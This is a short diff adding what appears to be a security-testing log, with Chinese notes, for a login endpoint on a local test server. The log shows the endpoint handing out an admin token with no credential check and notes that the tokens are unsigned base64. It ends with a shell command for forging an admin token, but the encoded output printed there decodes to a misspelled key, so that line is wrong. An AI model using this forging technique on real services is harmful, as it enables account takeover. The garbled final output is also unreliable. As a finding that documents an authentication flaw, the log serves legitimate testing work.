@@ -1,0 +1,11 @@
+REQ  GET http://127.0.0.1:18081/login?user=admin
+RESP HTTP/1.0 200 OK
+{"token": "eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=", "uid": "2"}
+base64 -d -> {"uid": "2", "user": "admin"}
+
+对照组（无 user 参数 / POST {"user":""}）:
+{"token": "eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9", "uid": "1"}  -> {"uid": "1", "user": ""}
+
+结论：/login 完全不校验凭据，user=admin 即签发 uid=2（admin）令牌；
+令牌仅 base64 无 HMAC，等价于可自行伪造。客户端/脚本可直接构造
+echo -n '{"uid": "2"}' | base64 -> eyJ1dWQiOiAiMiJ9
